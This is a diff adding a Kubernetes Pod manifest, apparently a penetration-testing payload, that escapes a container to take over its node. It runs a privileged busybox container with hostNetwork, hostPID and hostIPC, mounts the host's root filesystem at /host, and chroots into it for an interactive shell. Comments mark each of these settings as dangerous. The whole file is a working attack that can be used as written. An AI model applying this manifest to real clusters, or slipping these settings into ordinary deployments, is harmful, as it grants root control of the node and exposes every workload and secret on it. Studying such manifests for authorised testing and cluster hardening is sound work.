@@ -1,0 +1,29 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-privileged
+  labels:
+    app: pentest
+spec:
+  #noteName: ...  # you can specify the node: `kubectl get node -o jsonpath='{.items[*].metadata.name}'`
+  hostNetwork: true  # <-- dangerous option
+  hostPID: true      # <-- dangerous option
+  hostIPC: true      # <-- dangerous option
+  containers:
+  - name: main
+    image: busybox
+    securityContext:
+      privileged: true  # <-- dangerous option
+    command: ["chroot", "/host"]
+    tty: true
+    # command: [ "/bin/sh", "-c", "--" ]
+    # args: [ "while true; do sleep 30; done;" ]
+    stdin: true
+    stdinOnce: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+  volumes:
+  - name: noderoot
+    hostPath:  # <-- dangerous option
+      path: /
